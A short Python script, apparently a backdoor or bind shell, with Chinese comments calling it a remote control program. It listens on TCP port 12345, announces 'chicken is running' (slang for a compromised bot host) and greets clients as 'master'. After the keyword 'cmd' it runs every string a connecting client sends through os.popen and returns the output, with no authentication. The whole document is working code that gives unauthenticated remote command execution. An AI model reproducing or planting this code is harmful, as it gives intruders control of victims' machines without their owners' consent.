# ! /usr/bin/python3
# -*- coding: UTF-8 -*-
# 远程控制程序
import socket
import os

tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostname()
port = 12345
tcp_socket.bind((host, port))
tcp_socket.listen(5)
print("chicken is running")
while True:
    client_socket, client_addr = tcp_socket.accept()
    print("连接地址：", client_addr)
    client_socket.send('welcome master'.encode('utf-8'))
    while True:
        try:
            recv_data = client_socket.recv(1024).decode('utf-8')
            print(recv_data)
            if recv_data == 'cmd':
                client_socket.send('ok cmd start'.encode('utf-8'))
                while True:
                    try:
                        recv_data2 = client_socket.recv(1024).decode('utf-8')
                        if recv_data2 == "exit":
                            client_socket.send("ok cmd stop".encode('utf-8'))
                            break
                        else:
                            x = os.popen(recv_data2).read()
                            if x:
                                client_socket.send(x.encode('utf-8'))
                            else:
                                client_socket.send(recv_data2.encode('utf-8'))
                    except Exception as e:
                        print("command error")
                        print(e)
                        print('断开连接')
                        client_socket.send(
                            "command error and connecting break".encode('utf-8'))
                        break
            else:
                client_socket.send(recv_data.encode('utf-8'))
        except:
            print('断开连接')
            break
    client_socket.close()
tcp_socket.close()
